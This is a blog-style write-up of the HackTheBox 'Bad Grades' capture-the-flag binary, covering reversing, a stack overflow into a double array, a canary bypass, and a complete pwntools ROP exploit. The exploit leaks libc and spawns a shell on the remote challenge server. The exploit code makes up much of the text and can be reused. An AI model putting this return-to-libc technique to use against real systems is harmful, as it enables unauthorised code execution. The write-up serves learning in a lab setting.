---
layout: post
title: Binary Exploitation&#58; HacktheBox/Bad_Grades
---

# HacktheBox Bad Grades Write-up

Check the file type:
```
└─$ file bad_grades 
bad_grades: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=b60153cf4a14cf069c511baaae94948e073839fe, stripped
```

Check the securities:
```
└─$ checksec --file=bad_grades 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Full RELRO      Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols	  No	0		1		bad_grades
```

When we run the program, we are asked if we would like to view grades or add grades. ```
Your grades this semester were really good BAD!

1. View current grades.
2. Add new.
> 
```

If we select view current grades, it echoes some text back.
```
Your grades this semester were really good BAD!

1. View current grades.
2. Add new.
> 1

Your grades were: 
2
4
1
3
0

You need to try HARDER!
```

If we select add new, we are asked how many grades. Then we enter the grades and the average is echoed back.
```
Your grades this semester were really good BAD!

1. View current grades.
2. Add new.
> 2
Number of grades: 3
Grade [1]: 1
Grade [2]: 2
Grade [3]: 3
Your new average is: 2.00
```

## Reversing

Since the binary is stripped, it will be a little harder to reverse. We know the text that is output to the screen, so we can search the symbol tree for a function that displays said text.
```c
undefined8 FUN_00401108(void)

{
  long in_FS_OFFSET;
  int local_14;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  FUN_00400ea6();
  printf("Your grades this semester were really ");
  FUN_00400acb(&DAT_004013d7,"green","deleted");
  FUN_00400acb(" BAD!\n",&DAT_004012ba,"blink");
  printf("\n1. View current grades.\n2. Add new.\n> ");
  __isoc99_scanf(&DAT_0040137e,&local_14);
  if (local_14 == 1) {
    FUN_00400f1a();
  }
  else {
    if (local_14 != 2) {
      puts("Invalid option!\nExiting..");
                    /* WARNING: Subroutine does not return */
      exit(9);
    }
    FUN_00400fd5();
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

Looks like we found ```main```. Nothing of interest here, but if we navigate to the function for choice 2, we can see the add new grades function.
```c
void FUN_00400fd5(void)

{
  long in_FS_OFFSET;
  int local_128;
  int local_124;
  double local_120;
  double local_118 [33];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_120 = 0.0;
  FUN_00400acb(0,"Number of grades: ",&DAT_004012d8,&DAT_00401304);
  __isoc99_scanf(&DAT_0040137e,&local_128);
  for (local_124 = 0; local_124 < local_128; local_124 = local_124 + 1) {
    printf("Grade [%d]: ",(ulong)(local_124 + 1));
    __isoc99_scanf(&DAT_0040138e);
    local_120 = local_118[local_124] + local_120;
  }
  printf("Your new average is: %.2f\n");
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

Here we find a buffer overflow. When we are prompted for the number of grades, that number is used as the constraint for the for loop that loads in our grades. The for loop does not check the size of the buffer at any point. The tricky part is, is that the buffer is a ```double``` type, meaning we need to find a way to convert hex addresses into doubles. To do this we can use the ```struct.unpack``` module and the ```binascii.unhexlify``` module.
```python
def hex_to_double(hex_string):
    hex_string = p64(hex_string).hex() # Pack the address with a 64 bit packer and convert to hex   
    return str(struct.unpack('d', binascii.unhexlify(hex_string))).strip('(),')
```
## Pwn

Now we need to figure out how to bypass the canary. An interesting tidbit about ```scanf``` is that it will parse your input for the first instance of the data type specified in the format specifier. If it doesn't find a matching data type, it won't read any data into the buffer. So if we use any non-numeric character when inputing our grades, the canary will remain unmodified. Once we pass the canary on the stack, we can being inputing values to overwrite addresses.

The tricky part is calculating the offset to ```rip```. The array being read into is type ```double```, so each input will be 8 bytes. Since the array has 33 elements, the buffer is 8 * 33 = 264 bytes long. To find out how many more to ```rip```, we need to find the stack offset in the disassembly. For this I am using radare2 since it seems to give more accurate stack layouts. According to radare2, the buffer is ```0x110``` bytes from the saved base pointer, so ```rip``` should be ```0x110``` + 8 = 280 bytes.

Now our offset is 280 / 8 = 35 doubles. So everytime we craft a rop chain, we need 35 entries to reach out pointer. 

We can now craft our exploit.
```python
#!/usr/bin/env python3

from pwn import *
import binascii
import struct

# Buffer is double buffer[33] = 264 bytes long
# Address of buffer is 0x110 + 8 = 288 bytes away from rip
# 288 / 8 = 35 numbers from rip

# Useful Gadgets
pop_rdi       = 0x0000000000401263 # pop rdi; ret;
ret           = 0x0000000000400666# ret;
# Useful Addresses
puts_plt      = 0x00400680
puts_got      = 0x00601fa8
vuln_func     = 0x00400fd5
shell_offset  = 0x1b3e1a
system_offset = 0x000000000004f550

def hex_to_double(hex_string):
    hex_string = p64(hex_string).hex() # Pack the address with a 64 bit packer and convert to hex   
    return str(struct.unpack('d', binascii.unhexlify(hex_string))).strip('(),') # Need to make sure to use p64() to convert to little endian // format 'd' is for little endian, format '!d' is for big endian 

def main():
    context.arch = 'amd64'

    elf = ELF("./bad_grades")
    libc = ELF("./libc.so.6")

    target = remote("46.101.94.35", 30857)
    target.sendlineafter(b"> ", b"2")
    target.sendlineafter(b"Number of grades: ", b"43")

    for i in range(35):
        target.sendline(".")

    # Print newline
    target.sendline(hex_to_double(pop_rdi))
    target.sendline(hex_to_double(next(elf.search(b""))))
    target.sendline(hex_to_double(puts_plt)) 

    # Leak libc address 
    target.sendline(hex_to_double(pop_rdi))
    target.sendline(hex_to_double(puts_got))
    target.sendline(hex_to_double(puts_plt))
    
    # Return to vulnerable function for next rop chain
    target.sendline(hex_to_double(ret))
    target.sendline(hex_to_double(vuln_func))
    
    # Skip two newlines 
    target.recvline()
    target.recvline()

    # Retrieve puts address and calculate libc address
    leak = u64(target.recvline().strip().ljust(8, b'\x00'))
    server_libc_base_addr = leak - libc.symbols['puts']
    log.info(f"Server libc base address: {server_libc_base_addr}")
    libc.address = server_libc_base_addr

    target.sendlineafter(b"Number of grades: ", b"39")

    for i in range(35):
        target.sendline(".")

    # rop chain to call system
    target.sendline(hex_to_double(ret))
    target.sendline(hex_to_double(pop_rdi))
    target.sendline(hex_to_double(server_libc_base_addr + shell_offset))
    target.sendline(hex_to_double(server_libc_base_addr + system_offset)) 
    
    target.interactive()

if __name__=='__main__':
    main()
```

Running this on the remote server yields us our shell.

Et Voila!
